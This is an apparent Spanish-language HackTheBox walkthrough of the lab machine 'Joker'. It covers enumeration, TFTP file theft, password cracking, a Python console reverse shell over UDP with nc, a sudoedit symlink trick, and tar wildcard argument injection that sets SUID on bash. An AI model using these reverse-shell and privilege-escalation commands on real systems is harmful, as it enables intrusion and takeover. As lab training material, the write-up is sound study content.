---
layout: post
title: HTB_Joker
date: 2023/07/10
slug: HTB_Joker
heroImage: /assets/machines.jpg
---

# Joker {-}

## Introduccion {-}

La maquina del dia 26/07/2021 se llama Joker.

El replay del live se puede ver en [Twitch: S4vitaar Joker maquina](https://www.twitch.tv/videos/1098850596)
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.21
```
ttl: 63 -> maquina linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.21 
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.21 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,3128 10.10.10.21 -oN targeted
```

|Puerto|Servicio    | Que se nos occure?              |    Que falta?      |
|------|------------|---------------------------------|--------------------|
|22    |ssh         |Accesso directo                  |usuario y contraseña|
|3128  |squid-proxy |Browsear la web por este puerto  |Checkear el exploit |

#### Browsear la web por el puerto 3128{-}

Browseando la web con el url 
```bash
 http://10.10.10.21:3128 
```
 no da un error que es normal porque no pasamos por el **squid-proxy**.

Utilizamos el **FoxyProxy** para añadir las credenciales del Proxy. Como no tenemos el usuario y la contraseña, dejamos estos datos
vacios.


![squid-foxy-o-creds](/assets/images/squid-foxy-no-creds.png) 
#### Uso de curl con proxy {-}

La idea aqui es utilizar la herramienta **curl** con en argumento 
```bash
 --proxy 
```
 para ver si el puerto 80 esta abierto.

```bash
curl -s http://127.0.0.1 --proxy http://10.10.10.21:3128 | html2text
```

Hay un error de typo **ACCESS DENIED**, quiere decir que necesitamos un usuario y una contraseña.

Como nada esta abierto intentamos scanear la maquina por UDP

#### NMAP UPD Scan {-}

Como los scan de **NMAP** en UDP tarda un buen rato, decidimos ir a por los puertos mas interesantes.

```bash
nmap -sU -p69,161 10.10.10.21 -oN udpScan
```

encontramos el puerto del tftp que esta abierto

#### TFTP {-}

```bash
tftp 10.10.10.21
```

Nos podemos conectar pero no podemos cojer ficheros como 
```bash
 /etc/passwd 
```
, 
```bash
 /etc/hosts 
```
 y otros. Tiramos por el fichero de config de squid.

```bash
get /etc/squid/squid.conf
```

#### Check squid.conf file {-}

```bash
cat squid.conf | grep -v "^#" | sed '/^\s*$/d'
```

Vemos que hay un fichero password. Lo descargamos desde el **tftp**

```bash
get /etc/squid/passwords
```

Lo analizamos y encontramos un usuario y una contraseña encriptada.

## Evaluacion de vulnerabilidades {-}

### John {-}

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt passwords
```

Ya hemos crackeado la contraseña. Intentamos conectar por ssh pero no funciona.

Pues ponemos las credenciales en el foxyproxy.

### Conectamos por la web a la 127.0.0.1 {-}

Hay una pagina que propone shortear una url. Vamos a testear el servicio web

1. Nos creamos un servidor web con python

    ```bash
    python -m http.server 80
    ```
1. En el servicio intentamos shortear la url 
```bash
 http://10.10.14.20/test 
```


No hace nada. Vemos en el codigo fuente que hay un recurso 
```bash
 /list 
```
. La idea aqui es aplicar fuzzing. Como tenemos que pasar
por un proxy, vamos a utilizar **Burp** para conectar el fuzzer con el proxy.

1. Creamos un Proxy Server.

    - En la pagina **User options** de Burp, creamos un proxy server

        ```{r, echo = FALSE, fig.cap="BurpSuite: create proxy server", out.width="90%"}
            knitr::include_graphics("images/burp-create-proxy-server.png")

![bur-create-roxy-server](/assets/images/burp-create-proxy-server.png) 
    ```{r, echo = FALSE, fig.cap="BurpSuite: create proxy server 1", out.width="90%"}
        knitr::include_graphics("images/burp-add-port-80-1.png")
    ```


![bur-add-ort-80-1](/assets/images/burp-add-port-80-1.png) 
1. Testeamos con **curl**


![bur-add-ort-80-2](/assets/images/burp-add-port-80-2.png) 
Ya no nos pone el mensaje de error 
```bash
 Conexion reusada 
```
, quiere decir que el server proxy que hemos creado con
BurpSuite funciona. Ya podemos aplicar fuzzing.

### WFUZZ {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2-3-medium.txt http://127.0.0.1/FUZZ
```

Encontramos el recurse 
```bash
 /console 
```


### Consola Interactiva {-}

Estamos en frente de una consola interactiva donde se puede ejecutar code en python

```python
import os

os.system('whoami')
#Output
0
```

En este caso la respuesta al lado del servidor es 
```bash
 0 
```
. Suponemos que la respuesta es el codigo de estado. Utilizamos la funccion

```bash
 os.popen(<command>).read() 
```
 para ver el output normal.

```python
os.popen('whoami').read()
#Output
'Werkzeug'
```

El comando funcionna. Ahora intentamos **pingear** nuestra maquina de atacante.

1. en la maquina de atacante

    ```bash
    tcpdump -i tun0 icmp -n
    ```

1. En la consola interactiva python

    ```python
    os.system('ping -c 1 10.10.14.20')
    ```

Recibimos la trasa ICMP.

Intentamos recuperar ficheros de la maquina victima antes de entablar una reverse shell. Como el comando

```bash
 os.popen('cat /etc/passwd').read() 
```
 nos retorna el resultado en una linea y que no es muy legible, S4vi nos
recomienda encriptar la respuesta en base 64 para despues decodificarlo en la maquina de atacante con el comando

```bash
 echo "<cadena codificada en base64>" | base64 -d; echo 
```


```python
os.popen('base64 -w 0 /etc/passwd').read()
os.popen('base64 -w 0 /etc/iptables/rules.v4').read()
```

El iptables nos muestra con la linea 
```bash
 -A OUTPUT -o ens33 -p tcp -m state --state NEW -j DROP 
```
 que la maquina victima nos
va a rechazar todas las comunicaciones por **TCP**. Es por esta razon que no hemos creado directamente una reverse shell.
 ## Explotacion de vulnerabilidad & Ganando acceso {-}

### Reverse shell por UDP {-}

1. En la maquina de atacante con el parametro 
```bash
 -u 
```


    ```bash
    nc -u -nlvp 443
    ```

1.en la consola interactiva

    ```python
    os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -u 10.10.14.20 443 >/tmp/f")
    ```

Y ya esta...

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

### Investigamos la maquina {-}

```bash
whoami

#Output
werkzeug

cd /home/alekos
cat user.txt
```

No podemos leer la flag. Quiere decir que vamos a tener que convertirnos en el usuario alekos.

```bash
id
sudo -l
```

El comando 
```bash
 sudo -l 
```
 nos dice que podemos ejecutar 
```bash
 sudoedit /var/www/*/*/layout.html 
```
 como el usuario alekos. ## Escalada de privilegios {-}

### Escalada de privilegios al usuario alekos {-}

```bash
ls -l /var/www
```

No tenemos capacidad de escritura en el directorio 
```bash
 /var/www 
```
 pero hay un directorio testing donde el usuario proprietario es werkzeug.

```bash
cd /var/www/testing
ls -l
mkdir hannamod
cd !$
echo "Hola" > layout.html
```

Testeamos el comando **sudoedit**

```bash
sudoedit -u alekos /var/www/testing/hannamod/layout.html
```

El comando no abre un nano en el cual podemos editar el contenido. El truco aqui es burlar el fichero para que el usuario pueda editar
un ficher tercio en el cual tenga capacidad de escritura

1. Creamos un enlace symbolico contra el **authorized_keys** del usuario alekos

    ```bash
    ln -s -f /home/alekos/.ssh/authorized_keys layout.html
    ```

1. Nos creamos un par de claves

    ```bash
    ssh-keygen
    ```

1. Lanzamos el **sudoedit** y copiamos la clave publica creada
1. Nos conectamos al usuario alekos por ssh

    ```bash
    ssh -i id-rsa alekos@10.10.10.21
    ```

Pa dentro... somos alekos y podemos leer la flag.

### Escalada de privilegios al usuario root {-}

```bash
id
sudo -l
ls -l
```

vemos que hay dos directorios 

- backup
- development

```bash
cd backup
stat *
stat * | grep "Modify"
```

En el directorio backup vemos que cada 5 minutos una tarea que se esta ejecutando a intervalos regulares de tiempo nos crea un archivo de backup.
Ahora tenemos que saber lo que se esta poniendo en estos backups.

1. En la maquina de atacante

    ```bash
    nc -u -nlvp 443 > dev-1627332901.tar.gz
    ```

1. En la maquina victima

    ```bash
    nc -u 10.10.14.20 443 < dev-1627332901.tar.gz
    ```

mirando el contenido de fichero comprimido, nos damos cuenta que el contenido es el mismo que el directorio development.

Saviendo esto estamos intuiendo que la tarea cron ejecuta un comando del estilo: 
```bash
 tar -cvf backup/test.tar.gz /home/alekos/development/* 
```
.
Aqui el problema es que si el comando es este, el simbolo 
```bash
 * 
```
 permitteria burlar el comando tar con breakpoints. Lo que queremos ejecutar seria
el comando siguiente:

```bash
tar -cvf backup/test.tar.gz /home/alekos/development/* --checkpoint=1 --checkpoint-action=exec/bin/sh
```

El echo es que si el comando de la tarea cron tiene el asterisco y que ficheros tienen nombres como 
```bash
 --checkpoint=1 
```
 y 
```bash
 --checkpoint-action=exec/bin/sh 
```
,
en vez de copiarlos, los utilizaria como argumentos del proprio comando tar.

```bash
touch privesc
chmod +x privesc

nano privesc

############privesc content##############3

#!/bin/bash

chmod 4755 /bin/bash
```

```bash
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh privesc'
```

Ya esta esperamos hasta el proximo run de la tarea cron.

```bash
watch -n 1 ls -l /bin/bash -d
```

Cuando vemos que la /bin/bash tiene el 
```bash
 s 
```
 de SUID podemos convertirnos en root

```bash
bash -p
```

